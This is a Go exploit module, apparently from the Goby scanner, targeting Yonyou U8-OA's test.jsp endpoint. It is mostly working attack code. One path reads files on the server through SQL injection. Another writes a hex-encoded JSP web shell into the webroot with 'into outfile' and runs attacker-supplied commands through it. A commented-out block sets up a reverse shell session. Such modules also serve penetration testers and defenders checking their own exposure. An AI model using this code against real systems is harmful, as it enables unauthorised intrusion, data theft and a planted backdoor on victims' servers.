package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou U8-OA test.jsp RCE with SQLi",
    "Description": "When the user can control the parameters in the command execution function, Yonyou U8-OA can inject malicious system commands into normal commands, causing command execution attacks.",
    "Product": "用友U8-OA企业版",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2020-09-11",
    "Author": "gobysec@gmail.com",
    "FofaQuery": "title=\"用友U8-OA企业版\" || (body=\"致远A6-m协同管理软件\" && body=\"logn_layout\")",
    "Level": "3",
    "Impact": "When the user can control the parameters in the command execution function, malicious system commands can be injected into normal commands, causing command execution attacks",
    "Recommendation": "Upgrade ",
    "References": [
        "https://www.cnblogs.com/AtesetEnginner/p/12106741.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,basedir,readfile"
        },
        {
            "name": "filepath",
            "type": "select",
            "value": "d:/Program Files/UFIDA/U8-OA/tomcat/webapps/yyoa/WEB-INF/web.xml,d:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml",
            "show": "AttackType=readfile"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%200x514151)"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "0x514151",
                        "variable": "$body"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "QAQ",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce",
        "sqli"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "用友U8-OA企业版"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10180"
}`
	ynGetStringInBetween := func(str string, start string, end string) (result string) {
		//没有起始字符，说明直接从开头开始
		if len(str) > 0 {
			s := strings.Index(str, start)
			if s == -1 {
				return
			}
			s += len(start)
			str = str[s:]
		}

		//没有终止字符，说明直接到末尾
		if len(end) == 0 {
			return str
		}

		e := strings.Index(str, end)
		if e == -1 { //没有结束就是到末尾
			e = len(str)
		}
		return str[:e]
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			extractValue := func(sql string) (ret string) {
				cfg := httpclient.NewGetRequestConfig("/yyoa/common/js/menu/test.jsp?doType=101&S1=(" + sql + ")")
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if v := ynGetStringInBetween(resp.Utf8Html, "<td align=left>", "</td>"); len(v) > 0 {
						return v
					}
				}
				return
			}
			runCmd := func(cmd string) string {
				if dir := extractValue("SELECT%20@@basedir"); strings.Contains(dir, "mysql") {
					oadir := dir[:strings.Index(dir, "mysql")]
					oadir = strings.ReplaceAll(oadir, "\\", "/")
					// 上传文件
					Shell := `<%@ page import="java.util.*,java.io.*"%><pre><%if (request.getParameter("cmd")!=null){Process p;if(System.getProperty("os.name").toLowerCase().indexOf("windows")!=-1){p=Runtime.getRuntime().exec("cmd.exe /C "+request.getParameter("cmd"));}else{p=Runtime.getRuntime().exec(request.getParameter("cmd"));}DataInputStream d=new DataInputStream(p.getInputStream());String r=d.readLine();while(r!=null){out.println(r);r=d.readLine();}}%></pre>`
					shellContent := hex.EncodeToString([]byte(Shell))
					sql := "select%20unhex(%27" + shellContent +
						"%27)%20into%20outfile%20%27" + url.QueryEscape(oadir+"/tomcat/webapps/yyoa/common/js/menu/system_test.jsp") + "%27"
					extractValue(sql)
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/yyoa/common/js/menu/system_test.jsp?cmd=" + url.QueryEscape(cmd));
						err == nil && strings.Contains(resp.Utf8Html, "<pre>") && resp.StatusCode == 200 {
						v := ynGetStringInBetween(resp.Utf8Html, "<pre>", "</pre>")
						if len(v) > 0 {
							return v
						}
						return " "
					}
				}
				return ""
			}

			switch ss.Params["AttackType"].(string) {
			case "basedir":
				if dir := extractValue("SELECT%20@@basedir"); len(dir) > 0 {
					expResult.Success = true
					expResult.Output = dir
				}
			case "readfile":
				if v := extractValue("select%20load_file(%27" + url.QueryEscape(ss.Params["filepath"].(string)) + "%27)"); len(v) > 0 {
					expResult.Success = true
					expResult.Output = v
				}
			case "cmd":
				if v := runCmd(ss.Params["cmd"].(string)); len(v) > 0 {
					expResult.Success = true
					expResult.Output = v
				}
				//case "goby_shell_windows":
				//	waitSessionCh := make(chan string)
				//	if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
				//		log.Println("[WARNING] godclient bind failed", err)
				//		return expResult
				//	} else {
				//		go runCmd(godclient.ReverseTCPByPowershell(rp))
				//		expResult.Output = waitSession(waitSessionCh)
				//		if len(expResult.Output) > 0 {
				//			if u, err := url.Parse(expResult.Output); err == nil {
				//				expResult.OutputType = "html"
				//				sid := strings.Join(u.Query()["id"], "")
				//				expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
				//			}
				//			expResult.Success = true
				//		}
				//	}
			}

			return expResult
		},
	))
}
